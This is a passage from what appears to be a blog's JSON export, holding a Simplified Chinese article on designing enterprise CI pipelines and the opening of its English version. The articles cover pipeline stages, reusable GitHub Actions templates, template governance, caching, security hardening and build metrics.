是你不會注意到的——它只是每次都能運作，讓開發人員專注於建置優秀的軟體，而不是與工具搏鬥。」","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Enterprise","slug":"Enterprise","permalink":"https://neo01.com/tags/Enterprise/"},{"name":"DevOps","slug":"DevOps","permalink":"https://neo01.com/tags/DevOps/"},{"name":"Automation","slug":"Automation","permalink":"https://neo01.com/tags/Automation/"}],"lang":"zh-TW"},{"title":"企业级 CI Pipeline 设计：大规模构建可靠的自动化","slug":"2020/08/Designing-CI-Pipelines-for-Enterprise-zh-CN","date":"un44fin44","updated":"un55fin55","comments":true,"path":"/zh-CN/2020/08/Designing-CI-Pipelines-for-Enterprise/","permalink":"https://neo01.com/zh-CN/2020/08/Designing-CI-Pipelines-for-Enterprise/","excerpt":"学习如何为企业环境设计强健的 CI pipeline。探索可扩展性、安全性和持续集成工作流程可靠性的最佳实践。","text":"从手动部署转向自动化持续集成，已经彻底改变了企业交付软件的方式。然而，设计能在企业规模下可靠运作的 CI pipeline 面临独特挑战——从管理复杂的依赖关系到确保数百个微服务的安全合规性。 本指南探讨构建能够应对企业需求的 CI pipeline 的原则和实践，同时保持速度、可靠性和安全性。 理解企业级 CI 需求 企业级 CI pipeline 与初创公司或小团队的工作流程有根本性的差异。规模、复杂性和监管要求需要不同的方法。 规模考量：企业环境通常涉及数百个存储库、每天数千次构建，以及分散在不同时区的团队。你的 pipeline 必须处理这些量而不成为瓶颈。 安全与合规：金融服务、医疗保健和政府部门需要在每个阶段进行审计追踪、访问控制和合规验证。CI pipeline 必须自动执行这些要求。 多团队协调：不同团队在相互连接的服务上工作。你的 pipeline 需要检测破坏性变更、协调部署，并提供跨团队边界的可见性。 遗留系统集成：企业很少从零开始。你的 CI 系统必须与现有工具、数据库和部署流程集成，同时逐步现代化基础设施。 🎯 企业级 vs 初创公司 CI初创公司 CI：快速迭代、最少流程、可接受破坏性变更 企业级 CI：受控变更、广泛验证、对生产事故零容忍 差异不仅在于规模——而是理念。企业级 CI 优先考虑稳定性和合规性，而非纯粹的速度。 核心 Pipeline 架构 设计良好的企业级 CI pipeline 遵循平衡速度与彻底性的结构化流程。 graph LR A([📝 代码提交]) --> B([🔍 静态分析]) B --> C([🏗️ 构建]) C --> D([🧪 单元测试]) D --> E([📦 打包]) E --> F([🔐 安全扫描]) F --> G([🚀 部署到预发环境]) G --> H([✅ 集成测试]) H --> I([👤 人工审核]) I --> J([🌐 生产环境部署]) style A fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style F fill:#ffebee,stroke:#c62828,stroke-width:2px style I fill:#fff3e0,stroke:#f57c00,stroke-width:2px style J fill:#e8f5e9,stroke:#388e3c,stroke-width:2px 阶段 1：源代码控制集成 每个 pipeline 都从源代码控制开始。企业级 pipeline 必须支持： 分支保护：强制执行代码审查要求，防止直接提交到主分支 Webhook 可靠性：优雅地处理 webhook 失败并提供重试机制 Monorepo 支持：检测哪些服务发生变更并仅触发相关构建 阶段 2：静态分析与 Linting 在编译前捕获问题： 代码质量门禁：强制执行复杂度阈值、代码覆盖率最低标准 安全扫描：检测硬编码的机密信息、有漏洞的依赖项 许可合规：验证所有依赖项符合企业许可政策 阶段 3：构建与编译 构建阶段必须： 可重现：相同的输入总是产生相同的输出 缓存：重用先前构建的产物以减少时间 隔离：每次构建在干净的环境中执行以防止污染 阶段 4：测试金字塔 实施全面的测试策略： 单元测试：快速、隔离的测试在每次提交时执行。这些应该在几分钟内完成并提供即时反馈。 集成测试：验证组件协同工作。针对具有真实数据的预发环境执行。 端到端测试：验证关键用户旅程。这些较慢但能捕获单元测试遗漏的问题。 性能测试：确保变更不会降低系统性能。在代表性工作负载上执行。 graph TB A([🔺 测试金字塔]) A --> B([E2E 测试慢速、全面]) B --> C([集成测试中速]) C --> D([单元测试快速、聚焦]) style B fill:#ffebee,stroke:#c62828,stroke-width:2px style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px style D fill:#e8f5e9,stroke:#388e3c,stroke-width:2px 阶段 5：产物管理 打包和版本化你的构建： 语义化版本控制：根据提交消息自动递增版本 产物存储库：将构建存储在集中式存储库（Artifactory、Nexus） 不可变产物：创建后永不修改产物；改为创建新版本 阶段 6：安全验证 安全不能是事后想法： 容器扫描：检查 Docker 镜像是否有已知漏洞 依赖项分析：验证第三方库是最新且安全的 合规检查：确保构建符合监管要求（GDPR、HIPAA、SOC2） 阶段 7：部署阶段 渐进式部署降低风险： 开发环境：每次提交自动部署。开发人员可以立即测试变更。 预发环境：镜像生产环境配置。集成和 E2E 测试在此执行。 生产环境：需要人工审核。使用蓝绿或金丝雀策略部署。 企业级 CI 最佳实践 1. Pipeline 即代码 在版本控制文件中定义 pipeline（Jenkinsfile、.gitlab-ci.yml、GitHub Actions）。这提供： 版本历史：跟踪 pipeline 变更与代码变更 代码审查：pipeline 修改经过与代码相同的审查流程 可重用性：跨团队共享 pipeline 模板 # 示例：GitHub Actions 工作流程 name: Enterprise CI Pipeline on: push: branches: [main, develop] pull_request: branches: [main] jobs: build: runs-on: ubuntu-latest steps: - uses: actions&#x2F;checkout@v2 - name: Static Analysis run: npm run lint - name: Build run: npm run build - name: Unit Tests run: npm test - name: Security Scan run: npm audit 2. 模块化 Pipeline 模板 在拥有数十或数百个服务的企业环境中，维护单独 pipeline 变得不可持续。Pipeline 模板通过将常见模式提取到可重用模块来解决这个问题。 模板层次结构： graph TB A([🎯 基础模板所有项目的共同阶段]) --> B([☕ Java 模板Maven/Gradle 特定]) A --> C([🐍 Python 模板pip/pytest 特定]) A --> D([⚡ Node.js 模板npm/jest 特定]) B --> E([🔧 微服务 A自定义配置]) C --> F([🔧 微服务 B自定义配置]) D --> G([🔧 前端应用自定义配置]) style A fill:#e3f2fd,stroke:#1976d2,stroke-width:3px style B fill:#fff3e0,stroke:#f57c00,stroke-width:2px style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px style D fill:#fff3e0,stroke:#f57c00,stroke-width:2px style E fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style F fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style G fill:#e8f5e9,stroke:#388e3c,stroke-width:2px 基础模板示例（GitHub Actions）： # .github&#x2F;workflows&#x2F;templates&#x2F;base-pipeline.yml name: Base CI Template on: workflow_call: inputs: build_command: required: true type: string test_command: required: true type: string artifact_path: required: false type: string default: &#39;dist&#x2F;&#39; jobs: ci: runs-on: ubuntu-latest steps: - uses: actions&#x2F;checkout@v2 - name: Static Analysis uses: .&#x2F;.github&#x2F;actions&#x2F;static-analysis - name: Build run: $&#123;&#123; inputs.build_command &#125;&#125; - name: Test run: $&#123;&#123; inputs.test_command &#125;&#125; - name: Security Scan uses: .&#x2F;.github&#x2F;actions&#x2F;security-scan - name: Upload Artifacts uses: actions&#x2F;upload-artifact@v2 with: path: $&#123;&#123; inputs.artifact_path &#125;&#125; 服务特定 Pipeline（使用模板）： # microservice-a&#x2F;.github&#x2F;workflows&#x2F;ci.yml name: Microservice A CI on: [push, pull_request] jobs: build: uses: .&#x2F;.github&#x2F;workflows&#x2F;templates&#x2F;base-pipeline.yml with: build_command: &#39;mvn clean package&#39; test_command: &#39;mvn test&#39; artifact_path: &#39;target&#x2F;*.jar&#39; 基于模板的 Pipeline 优势： 一致性：所有服务遵循相同的质量门禁和安全检查 可维护性：通过变更一个模板更新 100 个 pipeline 入职：新服务自动继承最佳实践 治理：集中执行组织标准 减少重复：通用逻辑写一次，到处重用 模板组合模式： 1. 继承模式：模板扩展基础模板，添加语言特定逻辑 # Java 模板扩展基础模板 jobs: build: uses: .&#x2F;.github&#x2F;workflows&#x2F;templates&#x2F;base-pipeline.yml with: setup_command: &#39;setup-java@v2&#39; build_command: &#39;mvn package&#39; 2. Mixin 模式：组合多个可重用组件 jobs: security: uses: .&#x2F;.github&#x2F;workflows&#x2F;templates&#x2F;security-mixin.yml compliance: uses: .&#x2F;.github&#x2F;workflows&#x2F;templates&#x2F;compliance-mixin.yml build: needs: [security, compliance] uses: .&#x2F;.github&#x2F;workflows&#x2F;templates&#x2F;build.yml 3. 覆盖模式：服务可以在需要时覆盖特定阶段 jobs: build: uses: .&#x2F;.github&#x2F;workflows&#x2F;templates&#x2F;base-pipeline.yml with: build_command: &#39;mvn package&#39; # 覆盖：此服务需要延长测试超时 test_timeout: 30 📦 模板库组织按范围组织模板： .github/workflows/templates/ ├── base&#x2F; │ ├── ci-pipeline.yml # 核心 CI 流程 │ └── cd-pipeline.yml # 核心 CD 流程 ├── languages&#x2F; │ ├── java-pipeline.yml │ ├── python-pipeline.yml │ └── nodejs-pipeline.yml ├── mixins&#x2F; │ ├── security-scan.yml │ ├── compliance-check.yml │ └── performance-test.yml └── specialized&#x2F; ├── microservice-pipeline.yml └── frontend-pipeline.yml 模板版本控制策略： 模板随时间演进。对它们进行版本控制以防止破坏性变更： # 使用特定模板版本 jobs: build: uses: .&#x2F;.github&#x2F;workflows&#x2F;templates&#x2F;base-pipeline@v2.1.0 迁移路径： 发布新模板版本（v2.1.0） 服务按自己的步调逐步迁移 迁移期后弃用旧版本 宽限期后移除已弃用的模板 多团队模板可重用性 当组织中的多个团队共享和重用 pipeline 模板时，模板的真正力量才会显现。这需要仔细设计协作、治理和定制。 集中式模板存储库： 为共享模板创建专用存储库： ci-templates-repo&#x2F; ├── README.md # 使用指南和目录 ├── CHANGELOG.md # 版本历史 ├── templates&#x2F; │ ├── base&#x2F; │ ├── languages&#x2F; │ ├── mixins&#x2F; │ └── specialized&#x2F; ├── examples&#x2F; │ ├── java-service-example.yml │ ├── python-api-example.yml │ └── frontend-app-example.yml ├── tests&#x2F; │ └── template-validation&#x2F; └── docs&#x2F; ├── getting-started.md ├── customization-guide.md └── migration-guide.md 团队协作模型： graph TB A([🏢 平台团队模板拥有者]) -->|维护与发布| B([📦 模板存储库]) B -->|使用| C([👥 团队 AJava 服务]) B -->|使用| D([👥 团队 BPython API]) B -->|使用| E([👥 团队 C前端应用]) C -->|反馈与请求| A D -->|反馈与请求| A E -->|反馈与请求| A C -->|分享模式| F([💡 社区最佳实践]) D -->|分享模式| F E -->|分享模式| F F -->|影响| A style A fill:#e3f2fd,stroke:#1976d2,stroke-width:3px style B fill:#fff3e0,stroke:#f57c00,stroke-width:2px style F fill:#e8f5e9,stroke:#388e3c,stroke-width:2px 团队的定制层级： 允许团队在不 fork 模板的情况下进行定制： # 团队 A 的定制（team-a-defaults.yml） defaults: java_version: 11 maven_opts: &quot;-Xmx2048m&quot; test_timeout: 20 notification_channel: &quot;#team-a-builds&quot; # 团队 A 的服务同时使用模板和团队默认值 jobs: build: uses: org&#x2F;ci-templates&#x2F;java-microservice@v2.0.0 with: team_config: team-a-defaults.yml # 服务特定覆盖 test_timeout: 30 # 此服务需要更多时间 模板治理模型： 所有权结构： 平台团队：维护核心模板、审查变更、确保质量 模板推广者：来自各团队提供反馈的代表 服务团队：使用模板、报告问题、建议改进 变更管理流程： 提案：团队通过 issue/PR 提交模板变更请求 审查：平台团队和推广者审查影响 测试：针对多个团队的示例服务测试变更 Beta 发布：使用 -beta 标签发布新版本 迁移期：团队测试 beta 版本（2-4 周） 稳定发布：验证后升级为稳定版 弃用：旧版本弃用，设定 3 个月的日落期 多团队使用的模板版本控制： # 语义化版本控制与团队迁移跟踪 template: java-microservice version: 2.1.0 released: 2020-08-01 breaking_changes: false adoption: team-a: 15&#x2F;20 services migrated team-b: 8&#x2F;12 services migrated team-c: 20&#x2F;20 services migrated deprecated_versions: v1.x: sunset 2020-11-01 自助式模板目录： 为团队提供可搜索的目录： # 用于探索的模板元数据 name: java-microservice category: backend language: java use_cases: - REST APIs - Microservices - Batch jobs features: - Maven&#x2F;Gradle support - JUnit testing - Docker packaging - Kubernetes deployment teams_using: [team-a, team-b, team-d, team-f] maturity: stable maintainer: platform-team support_channel: &quot;#ci-templates-help&quot; 跨团队定制模式： 模式 1：团队特定 Mixin 团队可以创建与基础模板配合使用的自己的 mixin： # 团队 A 的自定义安全 mixin # team-a-security-mixin.yml steps: - name: Team A Security Scan run: .&#x2F;team-a-security-tool - name: Upload to Team A Dashboard run: .&#x2F;upload-results # 在服务 pipeline 中使用 jobs: build: uses: org&#x2F;ci-templates&#x2F;base@v2.0.0 team-security: uses: team-a&#x2F;team-a-security-mixin@v1.0.0 模式 2：参数化团队策略 模板接受团队特定的策略配置： # 模板支持团队策略 jobs: build: uses: org&#x2F;ci-templates&#x2F;java-microservice@v2.0.0 with: team_policy: | code_coverage_min: 80% security_scan: mandatory performance_test: optional approval_required: production_only 模式 3：联邦式模板扩展 团队可以在不修改原始模板的情况下扩展模板： # 团队 B 用他们的新增内容扩展基础模板 # team-b-java-extended.yml name: Team B Java Service extends: org&#x2F;ci-templates&#x2F;java-microservice@v2.0.0 additional_stages: post_build: - name: Team B Metrics run: .&#x2F;collect-team-metrics - name: Team B Notification run: .&#x2F;notify-team-dashboard 衡量多团队模板成功： 跟踪采用率和有效性： metrics: adoption_rate: 85% # 170&#x2F;200 服务使用模板 teams_using: 12&#x2F;15 average_customization: 15% # 团队覆盖多少 template_update_frequency: 2.3&#x2F;month breaking_changes: 0.2&#x2F;year support_tickets: 3.5&#x2F;month time_to_onboard_new_service: 2 hours (was 2 weeks) 沟通与支持： 文档门户：每个模板的可搜索文档与示例 Slack 频道：#ci-templates-help 用于问题和讨论 办公时间：每周平台团队协助团队的会议 电子报：每月更新新模板和改进 模板展示：每季成功模式的演示 🌟 多团队成功故事拥有 15 个团队、250 个服务的电商公司： 挑战：每个团队以不同方式构建 pipeline，导致： 不一致的安全实践 跨团队协作困难 高维护负担 新工程师入职缓慢 解决方案：实施共享模板库： 6 个基础模板（Java、Python、Node.js、Go、Mobile、Data） 团队特定定制层级 联邦治理模型 自助式目录 6 个月后的结果： 85% 模板采用率（213/250 服务） pipeline 维护时间减少 90% 100% 服务现在有安全扫描 新服务入职：2 小时（原为 2 周） 跨团队协作改善（共享模式） 3 个团队贡献改进回模板 关键成功因素：标准化与团队自主权之间的平衡 模板治理： 所有权：平台团队维护模板，服务团队使用它们 变更流程：模板变更需要审查和测试 文档：每个模板包含使用示例和参数 指标：跟踪模板采用率并识别改进机会 3. 快速失败原则 先执行快速检查。如果静态分析失败，不要浪费时间在构建和测试上。这节省计算资源并提供更快的反馈。 最佳阶段顺序： Linting（秒） 静态分析（1-2 分钟） 构建（2-5 分钟） 单元测试（5-10 分钟） 集成测试（10-20 分钟） E2E 测试（20-30 分钟） 4. 并行执行 同时执行独立任务： 测试并行化：将测试套件分散到多个运行器 多平台构建：同时为不同平台构建 独立服务：并行构建微服务 这可以将 pipeline 时间从数小时减少到数分钟。 5. 缓存策略 实施积极的缓存： 依赖项缓存：缓存 npm、Maven 或 pip 依赖项 构建缓存：当源代码未变更时重用编译产物 Docker 层缓存：利用 Docker 的层缓存加快镜像构建 💡 缓存失效缓存失效是出了名的困难。使用基于内容的缓存键（依赖文件的哈希）而非基于时间的过期。这确保缓存仅在依赖项实际变更时失效。 6. 环境一致性 保持开发、预发和生产环境尽可能相似： 基础设施即代码：使用 Terraform 或 CloudFormation 定义环境 配置管理：在所有环境中使用相同的配置系统 数据一致性：在预发环境中尽可能使用匿名化的生产数据 7. 监控与可观测性 为你的 pipeline 添加监测： 构建指标：跟踪构建持续时间、成功率、失败原因 资源使用：监控构建期间的 CPU、内存和磁盘使用 告警：当 pipeline 失败或性能下降时通知团队 8. 安全强化 保护你的 CI 基础设施： 机密管理：使用保管库系统（HashiCorp Vault、AWS Secrets Manager）管理凭证 最小权限：为每个 pipeline 阶段授予所需的最小权限 审计日志：记录所有 pipeline 执行和访问尝试 网络隔离：在隔离网络中执行构建以防止横向移动 ⚠️ 常见安全错误 在环境变量中存储凭证 以管理员权限执行构建 允许在 pull request 中执行任意代码 将内部服务暴露给构建运行器 未能定期轮换凭证 单一 Pipeline 适用所有应用的辩论 企业级 CI 设计中反复出现的问题：你应该创建一个处理所有应用的通用 pipeline，还是为不同用例维护专门的 pipeline？答案，就像大多数架构决策一样，是微妙的。 通用 Pipeline 的吸引力 这个想法很诱人：一个 pipeline 统治所有。每个应用，无论语言或框架，都通过相同的阶段和相同的质量门禁。 理论优势： 整个组织的终极一致性 单一维护点 简化治理和合规 新团队更容易入职 现实检验： 真正的通用 pipeline 要么变得过于通用而无用，要么过于复杂而难以维护。考虑这些情境： graph TB A([通用 Pipeline]) --> B{应用类型？} B -->|Java| C[Maven 构建JUnit 测试JAR 打包] B -->|Python| D[pip installpytestWheel 打包] B -->|Node.js| E[npm installJest 测试Docker 镜像] B -->|Go| F[go buildgo test二进制打包] B -->|Mobile| G[Gradle/XcodeUI 测试App store 部署] style A fill:#ffebee,stroke:#c62828,stroke-width:3px style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style D fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style E fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style F fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style G fill:#e8f5e9,stroke:#388e3c,stroke-width:2px 复杂度爆炸： 处理所有这些情况的通用 pipeline 需要： 每种语言和框架的条件逻辑 指定应用类型的配置文件 识别项目结构的检测机制 检测失败时的后备策略 跨所有支持情境的广泛测试 结果？一个 2000 行的 pipeline 配置，没人完全理解，每个人都害怕触碰。 解决方案的光谱 与其二元选择，不如考虑一个光谱： 层级 1：完全专门化的 Pipeline 每个应用都有独特的 pipeline 最大灵活性，零重用 大规模维护噩梦 层级 2：语言特定模板 ⭐（推荐） Java、Python、Node.js 等的独立模板 每个模板针对其生态系统优化 服务继承并根据需要定制 层级 3：混合通用 Pipeline 具有语言特定插件的基础 pipeline 中等复杂度，良好重用 需要复杂的插件架构 层级 4：完全通用 Pipeline 一个 pipeline 处理所有事情 最大一致性，高复杂度 难以维护和扩展 🎯 最佳平衡点**层级 2（语言特定模板）**为大多数企业提供最佳平衡： 一致性：所有 Java 服务使用相同的 Java 模板 优化：每个模板使用语言特定的最佳实践 可维护性：5-10 个模板而非 200 个独特 pipeline 灵活性：服务可以在需要时覆盖 简单性：每个模板都专注且易于理解 通用 Pipeline 何时有效 通用 pipeline 在特定情境下可以成功： 同质环境： 组织标准化为单一语言/框架 所有服务遵循相同的架构模式 示例：100% Go 服务的微服务公司 容器优先组织： 每个应用都构建 Docker 镜像 Pipeline 专注于容器生命周期，而非语言特定 语言特定步骤发生在 Dockerfile 内 # 通用容器 pipeline stages: - lint - build-image # Dockerfile 处理语言特定 - test-image - scan-image - push-image - deploy 高度抽象的平台： 平台团队提供构建抽象 应用声明依赖项，平台处理构建 示例：具有通用规则的 Bazel 或 Buck 构建系统 基于模板的方法（推荐） 与其强制所有东西通过一个 pipeline，不如创建一系列专门的模板： Templates&#x2F; ├── base-template.yml # 所有继承的共同阶段 ├── java-microservice.yml # 扩展基础，添加 Maven&#x2F;Gradle ├── python-service.yml # 扩展基础，添加 pip&#x2F;pytest ├── nodejs-frontend.yml # 扩展基础，添加 npm&#x2F;webpack ├── mobile-ios.yml # 扩展基础，添加 Xcode ├── mobile-android.yml # 扩展基础，添加 Gradle └── data-pipeline.yml # 扩展基础，添加 Spark&#x2F;Airflow 每个模板针对其领域优化： # java-microservice.yml extends: base-template.yml stages: - validate: - checkstyle - spotbugs - build: - maven: clean package - cache: ~&#x2F;.m2&#x2F;repository - test: - junit: test - jacoco: coverage &gt; 80% - package: - docker: build - artifact: target&#x2F;*.jar # nodejs-frontend.yml extends: base-template.yml stages: - validate: - eslint - prettier - build: - npm: ci - webpack: build --production - cache: node_modules&#x2F; - test: - jest: --coverage - cypress: e2e - package: - s3: upload dist&#x2F; 决策框架 使用此框架决定你的方法： 选择通用 Pipeline 如果： ✅ 所有应用使用相同语言/框架 ✅ 组织有强大的平台工程团队 ✅ 容器优先架构与语言抽象 ✅ 愿意大量投资于 pipeline 复杂度 选择基于模板的方法如果： ✅ 使用多种语言和框架 ✅ 不同应用类型（web、mobile、data、ML） ✅ 团队需要特殊需求的灵活性 ✅ 想要一致性与可维护性之间的平衡 选择专门化 Pipeline 如果： ✅ 非常小的组织（&lt;10 个服务） ✅ 高度多样化的技术栈 ✅ 每个应用都有独特的部署需求 ✅ 快速实验比一致性更重要 ⚠️ 反模式：超大型 Pipeline避免创建具有数百个条件分支的单一 pipeline： # 不要这样做 if language &#x3D;&#x3D; &quot;java&quot;: if build_tool &#x3D;&#x3D; &quot;maven&quot;: if java_version &#x3D;&#x3D; &quot;8&quot;: run: mvn -Djava.version&#x3D;8 package elif java_version &#x3D;&#x3D; &quot;11&quot;: run: mvn -Djava.version&#x3D;11 package elif build_tool &#x3D;&#x3D; &quot;gradle&quot;: # ... 更多条件 elif language &#x3D;&#x3D; &quot;python&quot;: # ... 更多条件 这变得难以维护且容易出错。改用模板。 结论：务实的灵活性 问题不是「一个 pipeline 能适用所有应用吗？」而是「应该吗？」对大多数企业来说答案是否定的。相反： 创建基础模板，包含共同阶段（安全、合规、部署） 构建专门模板，针对每个主要技术栈 允许定制，团队有合理的特殊需求时 维护治理，通过基础模板中的必需阶段 衡量和迭代，基于实际使用模式 这种方法在重要的地方提供一致性（安全、合规），同时在有帮助的地方允许优化（语言特定工具）。这是与你的组织一起扩展的务实中间地带。 处理常见企业挑战 挑战 1：构建时间过长 问题：构建耗时 30 分钟以上让开发人员沮丧并减缓交付。 解决方案： 实施增量构建（仅重建变更的组件） 使用分布式构建系统（Bazel、Buck） 投资更快的构建基础设施 并行化测试执行 积极缓存 挑战 2：不稳定的测试 问题：通过/失败不一致的测试侵蚀对 CI 的信心。 解决方案： 隔离不稳定的测试（单独执行，不阻塞 pipeline） 为依赖网络的测试添加重试逻辑 使用测试隔离技术 监控测试可靠性指标 分配时间进行测试维护 挑战 3：依赖项管理 问题：跨数百个服务管理依赖项变得混乱。 解决方案： 使用依赖项管理工具（Dependabot、Renovate） 实施自动化依赖项更新 维护已批准的依赖项清单 使用锁定文件确保可重现的构建 定期进行依赖项安全审计 挑战 4：多团队协调 问题：团队在部署期间互相干扰。 解决方案： 实施部署时间窗口 使用功能标志将部署与发布解耦 建立明确的所有权边界 创建共享 pipeline 模板 定期跨团队同步会议 挑战 5：合规与审计要求 问题：监管要求需要广泛的文档和控制。 解决方案： pipeline 中的自动化合规检查 不可变审计日志 生产部署的审批工作流程 自动化审计证据收集 定期合规审查 工具与技术 CI/CD 平台 Jenkins：最灵活，需要大量维护。最适合具有现有 Jenkins 专业知识的复杂企业需求。 GitLab CI：与源代码控制集成，适合想要一体化解决方案的团队。 GitHub Actions：非常适合以 GitHub 为中心的工作流程，不断增长的 action 生态系统。 CircleCI：强大的性能，良好的缓存，扩展性好。 AWS CodePipeline：原生 AWS 集成，无服务器执行模型。 构建工具 Maven/Gradle：Java 生态系统标准 npm/Yarn：JavaScript 包管理 Make：通用构建自动化 Bazel：Google 的构建系统，非常适合 monorepo 测试框架 JUnit/TestNG：Java 测试 Jest/Mocha：JavaScript 测试 pytest：Python 测试 Selenium：浏览器自动化 JMeter：性能测试 安全工具 SonarQube：代码质量和安全分析 Snyk：依赖项漏洞扫描 Trivy：容器安全扫描 OWASP Dependency-Check：开源依赖项分析 衡量 Pipeline 成功 跟踪这些关键指标： 构建成功率：通过的构建百分比。目标：&gt;95% 平均反馈时间：开发人员获得构建结果的速度。目标：&lt;10 分钟 部署频率：部署到生产环境的频率。目标：每天多次 变更失败率：导致事故的部署百分比。目标：&lt;5% 平均恢复时间：从失败中恢复的速度。目标：&lt;1 小时 (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_17d8d7f8e')); var option = { \"title\": { \"text\": \"CI Pipeline 性能指标\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"构建成功率\", \"部署频率\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"第 1 周\", \"第 2 周\", \"第 3 周\", \"第 4 周\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"百分比\" }, \"series\": [ { \"name\": \"构建成功率\", \"type\": \"line\", \"data\": [92, 94, 96, 97], \"itemStyle\": { \"color\": \"#388e3c\" } }, { \"name\": \"部署频率\", \"type\": \"line\", \"data\": [85, 88, 91, 93], \"itemStyle\": { \"color\": \"#1976d2\" } } ] }; chart.setOption(option); } })(); 结论 为企业环境设计 CI pipeline 需要平衡竞争需求：速度与彻底性、灵活性与标准化、创新与稳定性。这里概述的原则——快速失败、积极缓存、全面测试、默认安全——为构建与你的组织一起扩展的 pipeline 提供了基础。 记住，CI pipeline 设计永远不会完成。随着你的组织成长、技术演进和需求变化，你的 pipeline 必须适应。投资使它们可维护、可观测和持续改进。 目标不是完美——而是构建一个可靠地交付高质量软件的系统，同时使团队能够快速移动和创新。通过深思熟虑的设计和持续改进，你的 CI pipeline 成为竞争优势而非瓶颈。 💭 最后的想法「最好的 CI pipeline 是你不会注意到的——它只是每次都能运作，让开发人员专注于构建优秀的软件，而不是与工具搏斗。」","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Enterprise","slug":"Enterprise","permalink":"https://neo01.com/tags/Enterprise/"},{"name":"DevOps","slug":"DevOps","permalink":"https://neo01.com/tags/DevOps/"},{"name":"Automation","slug":"Automation","permalink":"https://neo01.com/tags/Automation/"}],"lang":"zh-CN"},{"title":"Designing CI Pipelines for Enterprise: Building Reliable Automation at Scale","slug":"2020/08/Designing-CI-Pipelines-for-Enterprise","date":"un44fin44","updated":"un55fin55","comments":true,"path":"2020/08/Designing-CI-Pipelines-for-Enterprise/","permalink":"https://neo01.com/2020/08/Designing-CI-Pipelines-for-Enterprise/","excerpt":"Learn how to design robust CI pipelines for enterprise environments. Explore best practices for scalability, security, and reliability in continuous integration workflows.","text":"The shift from manual deployments to automated continuous integration has transformed how enterprises deliver software. Yet designing CI pipelines that work reliably at enterprise scale presents unique challenges - from managing complex dependencies to ensuring security compliance across hundreds of microservices. This guide explores the principles and practices for building CI pipelines that can handle enterprise demands while maintaining speed, reliability, and security. Understanding Enterprise CI Requirements Enterprise CI pipelines differ fundamentally from startup or small team workflows. The scale, complexity, and regulatory requirements demand a different approach. Scale Considerations: Enterprise environments often involve hundreds of repositories, thousands of builds per day, and teams distributed across time zones. Your pipeline must handle this volume without becoming a bottleneck. Security and Compliance: Financial services, healthcare, and government sectors require audit trails, access controls, and compliance validation at every stage. CI pipelines must enforce these requirements automatically. Multi-Team Coordination: Different teams work on interconnected services. Your pipeline needs to detect breaking changes, coordinate deployments, and provide visibility across team boundaries. Legacy Integration: Enterprises rarely start from scratch. Your CI system must integrate with existing tools, databases, and deployment processes while gradually modernizing the infrastructure. 🎯 Enterprise vs Startup CIStartup CI: Fast iteration, minimal process, breaking changes acceptable Enterprise CI: Controlled changes, extensive validation, zero tolerance for production incidents The difference isn't just scale - it's philosophy. Enterprise CI prioritizes stability and compliance over raw speed. Core Pipeline Architecture A well-designed enterprise CI pipeline follows a structured flow that balances speed with thoroughness. graph LR A([📝 Code Commit]) --> B([🔍 Static Analysis]) B --> C([🏗️ Build]) C --> D([🧪 Unit Tests]) D --> E([📦 Package]) E --> F([🔐 Security Scan]) F --> G([🚀 Deploy to Staging]) G --> H([✅ Integration Tests]) H --> I([👤 Manual Approval]) I --> J([🌐 Production Deploy]) style A fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style F fill:#ffebee,stroke:#c62828,stroke-width:2px style I fill:#fff3e0,stroke:#f57c00,stroke-width:2px style J fill:#e8f5e9,stroke:#388e3c,stroke-width:2px Stage 1: Source Control Integration Every pipeline begins with source control. Enterprise pipelines must support: Branch Protection: Enforce code review requirements, prevent direct commits to main branches Webhook Reliability: Handle webhook failures gracefully with retry mechanisms Monorepo Support: Detect which services changed and trigger only relevant builds Stage 2: Static Analysis and Linting Catch issues before compilation: Code Quality Gates: Enforce complexity thresholds, code coverage minimums Security Scanning: Detect hardcoded secrets, vulnerable dependencies License Compliance: Verify all dependencies meet corporate licensing policies Stage 3: Build and Compilation The build stage must be: Reproducible: Same inputs always produce identical outputs Cached: Reuse artifacts from previous builds to minimize time Isolated: Each build runs in a clean environment to prevent contamination Stage 4: Testing Pyramid Implement a comprehensive testing strategy: Unit Tests: Fast, isolated tests run on every commit. These should complete in minutes and provide immediate feedback. Integration Tests: Verify components work together. Run against staging environments with realistic data. End-to-End Tests: Validate critical user journeys. These are slower but catch issues that unit tests miss. Performance Tests: Ensure changes don’t degrade system performance. Run on representative workloads. graph TB A([🔺 Testing Pyramid]) A --> B([E2E TestsSlow, Comprehensive]) B --> C([Integration TestsMedium Speed]) C --> D([Unit TestsFast, Focused]) style B fill:#ffebee,stroke:#c62828,stroke-width:2px style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px style D fill:#e8f5e9,stroke:#388e3c,stroke-width:2px Stage 5: Artifact Management Package and version your builds: Semantic Versioning: Automatically increment versions based on commit messages Artifact Repository: Store builds in a centralized repository (Artifactory, Nexus) Immutable Artifacts: Never modify artifacts after creation; create new versions instead Stage 6: Security Validation Security cannot be an afterthought: Container Scanning: Check Docker images for known vulnerabilities Dependency Analysis: Verify third-party libraries are up-to-date and secure Compliance Checks: Ensure builds meet regulatory requirements (GDPR, HIPAA, SOC2) Stage 7: Deployment Stages Progressive deployment reduces risk: Development Environment: Automatic deployment for every commit. Developers can test changes immediately. Staging Environment: Mirrors production configuration. Integration and E2E tests run here. Production Environment: Requires manual approval. Deploy using blue-green or canary strategies. Best Practices for Enterprise CI 1. Pipeline as Code Define pipelines in version-controlled files (Jenkinsfile, .gitlab-ci.yml, GitHub Actions). This provides: Version History: Track pipeline changes alongside code changes Code Review: Pipeline modifications go through the same review process as code Reusability: Share pipeline templates across teams # Example: GitHub Actions 